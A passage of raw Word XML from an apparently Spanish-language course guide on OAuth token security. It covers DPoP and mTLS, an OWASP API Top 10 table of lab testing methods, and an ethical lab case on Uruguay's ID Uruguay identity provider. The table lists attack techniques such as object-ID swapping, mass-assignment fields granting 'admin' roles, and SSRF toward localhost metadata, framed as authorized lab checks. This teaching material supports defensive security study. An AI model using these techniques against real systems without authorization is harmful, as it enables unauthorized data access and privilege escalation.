              <w:t>/almacenamiento sin cifrar del cliente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Refresh usado contra la API de recursos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Mandá el refresh a un endpoint de recursos de tu lab: debe rechazarse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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Rotación + detección de reuso, vida absoluta, binding al cliente, almacenamiento seguro, revocación en logout/cambio de contraseña.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M9 — mTLS y DPoP (sender-constrained) (2020 / 2023)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2687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ender_constrain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6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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Del bearer a los tokens sender-constrained</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Atar el token a su portador. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>mTLS + token atado a certificado: RFC 8705, febrero de 2020.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>DPoP: RFC 9449, octubre de 2023.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Con DPoP, el cliente firma cada request con su clave privada; el token sólo sirve presentado con esa prueba.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"Si el problema del bearer es que cualquiera que lo tenga lo usa, la solución es exigir algo más que la posesión. mTLS ata el token al certificado; DPoP ata el token a una clave privada que el cliente prueba en cada request. Es la idea de OAuth 1.0, pero bien integrada. RFC 9700 (2025) ya los recomienda."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">DPoP — construí una prueba </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>conceptual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con Python (sin servidor real):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# La prueba DPoP es un JWT firmado por el CLIENTE con su clave privada</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Header típico: {"typ":"dpop+jwt","alg":"ES256","jwk":{...}}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Claims: jti (único), htm (método), htu (URL), iat</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># El servidor rechaza si htm/htu no coinciden con el request, o si el jti se repite</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Para una prueba real y segura, levantá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Keycloak en Docker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (soporta DPoP) y hacé el flujo contra tu propio Keycloak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (lab propio)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DPoP sin validar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htm</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/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htu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Cambiá el método o la URL del request manteniendo la prueba: ¿lo acepta?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Replay de la prueba (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jti</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>)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Reenviá la misma prueba dos veces: debe rechazarse</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>ath</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ausente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Presentá el access token sin atar la prueba al token (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ath</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> = hash del access token)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Nonce de servidor ignorado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Si el server exige nonce, probá sin él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i w:val="0"/>
              </w:rPr>
              <w:t>mTLS mal configurado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 xml:space="preserve">En tu lab, probá presentar un token atado a un certificado </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>sin</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> el certificado: debe fallar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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Validar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htm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htu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jti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (anti-replay), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>ath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alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> permitido; rotación de claves; y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9449 / RFC 8705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M10 — OWASP API Security Top 10 (laboratorio)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9144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owasp_top1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1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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>OWASP API Security Top 10 (2023)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Éste es el "atlas" para elegir qué probar. Cada ítem con su forma de comprobarlo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>en un lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId23">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP API Security Top 10 – 2023</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>#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Riesgo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Cómo se comprueba (lab)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Herramienta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i w:val="0"/>
              </w:rPr>
              <w:t>API1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BOLA</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> — Broken Object Level Authorization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 xml:space="preserve">Con </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>tu</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> token, cambiá el ID del objeto por otro del lab (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/api/pedidos/1234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5678</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>) y mirá si devuelve datos ajenos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Burp/Postman + ffuf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i w:val="0"/>
              </w:rPr>
              <w:t>API2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Broken Authentication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Login sin rate-limit, JWT sin validar, credenciales por defecto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jwt_tool, Burp Intruder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i w:val="0"/>
              </w:rPr>
              <w:t>API3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BOPLA / Mass Assignment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Mandá campos extra (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"rol":"admin"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"saldo":999</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>) y observá si se aplican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Postman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i w:val="0"/>
              </w:rPr>
              <w:t>API4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Unrestricted Resource Consumption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Paginación gigante, búsquedas costosas; medí CPU/latencia en tu lab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ab, k6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i w:val="0"/>
              </w:rPr>
              <w:t>API5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BFLA</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> — Broken Function Level Authorization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Con usuario normal, llamá endpoints de admin (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/admin/...</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>)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Postman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i w:val="0"/>
              </w:rPr>
              <w:t>API6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Sensitive Business Flows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Repetí un flujo (cupón, reintento de pago) más veces de las permitidas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script propio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i w:val="0"/>
              </w:rPr>
              <w:t>API7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SSRF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 xml:space="preserve">Endpoint que recibe una URL: apuntalo a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http://localhost</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/metadatos en tu lab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Burp Collaborator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i w:val="0"/>
              </w:rPr>
              <w:t>API8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Misconfiguration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 xml:space="preserve">CORS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*</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, errores verbosos, métodos no documentados, TLS débil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nuclei, ZAP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i w:val="0"/>
              </w:rPr>
              <w:t>API9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Improper Inventory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Versiones viejas (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/v1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/beta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/swagger</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>) expuestas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ffuf, gobuster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i w:val="0"/>
              </w:rPr>
              <w:t>API10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Unsafe Consumption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Confiar en datos de terceros (respuesta de otro servicio) sin validar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manual</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Laboratorios oficiales/diseñados para romper:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId24">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP crAPI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, DVGA, </w:t>
      </w:r>
      <w:hyperlink r:id="rId25">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP Juice Shop</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, VAmPI, y los labs de </w:t>
      </w:r>
      <w:hyperlink r:id="rId26">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">PortSwigger Web Security Academy</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (JWT, OAuth, BOLA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M11 — Caso ID Uruguay (laboratorio ético)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ID Uruguay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es el proveedor de identidad del Estado uruguayo, gestionado por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>AGESIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Se integra vía </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OpenID Connect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y su documentación técnica muestra el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>token endpoint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1F3B66"/>
        </w:rPr>
        <w:t>/oidc/v1/token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>token_type</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> = "Bearer"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ID token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en formato </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, y llamadas a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>UserInfo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Bearer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Documentación oficial: https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guía "Desarrollo seguro" (AGESIC): https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>La línea ética, explícita</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vos podés</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ejecutar el flujo completo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>con tu propia cuenta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu propio cliente de desarrollo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (o el de tu organización, con autorización interna). Eso incluye observar tus tokens, decodificar tu ID token y verificar la configuración de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> integración.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vos NO podés</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (sin autorización escrita de AGESIC): probar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>redirect_uri</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de otros clientes, atacar al IdP, automatizar intentos, intentar acceder a datos de otras personas, ni "probar qué pasa si cambio el token".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Si querés evaluar el IdP en sí: coordiná con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>AGESIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y canalizá por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Verificación defensiva de tu integración (permitida y útil)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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Control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Cómo verificarlo en TU cliente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Resultado esperado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Referencia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i w:val="0"/>
              </w:rPr>
              <w:t>PKCE obligatorio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 xml:space="preserve">Revisá tu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authorization</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> request: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code_challenge</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0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code_challenge_method=S256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Presente y verificado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RFC 7636 / RFC 9700</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>redirect_uri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> exacta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Confirmá que registrás la URI exacta (sin comodines) y que tu app la valida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Coincidencia exacta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RFC 9700</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>state</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>nonce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Verificá que tu app genera y valida ambos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Presentes, aleatorios, de un solo uso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OIDC Core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i w:val="0"/>
              </w:rPr>
              <w:t>Validación del ID token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 xml:space="preserve">Tu código debe validar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iss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aud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exp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nonce</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> y la firma contra JWKS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Todo validado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OIDC Core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i w:val="0"/>
              </w:rPr>
              <w:t>ID token no se usa como access token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Buscá en tu código si el ID token se envía a APIs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Nunca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OIDC Core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i w:val="0"/>
              </w:rPr>
              <w:t>Vida del access token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 xml:space="preserve">Decodificá tu access token (si es JWT) y mirá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exp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Corta y acorde al riesgo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RFC 9068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i w:val="0"/>
              </w:rPr>
              <w:t>Rotación de refresh token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Pedí dos veces seguidas: ¿el refresh cambia y el viejo se invalida?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Rotación + detección de reuso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RFC 9700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i w:val="0"/>
              </w:rPr>
              <w:t>Revocación / logout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Cerrá sesión y probá si tu token/refresh ya no sirve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Invalidado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RFC 7009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i w:val="0"/>
              </w:rPr>
              <w:t>Transporte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Verificá TLS y que no se acepten tokens por HTTP ni en query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Sólo HTTPS + header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RFC 9700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i w:val="0"/>
              </w:rPr>
              <w:t>Almacenamiento en tu cliente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 xml:space="preserve">¿Dónde guarda tu app el token? (memoria/cookie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HttpOnly</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> mejor que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localStorage</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>)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Sin acceso por JS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OWASP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Guion de la demostración en clase (sin riesgo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Mostrá la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>documentación oficial</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de ID Uruguay: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>token_type: Bearer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> e ID token JWT. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(Cero pruebas a nadie.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">En </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu propio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> login con tu cuenta, abrí DevTools → Network y mostrá la respuesta del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>token endpoint</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y la cabecera </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Bearer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>enmascarando el token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 xml:space="preserve">Decodificá </w:t>
      </w:r>
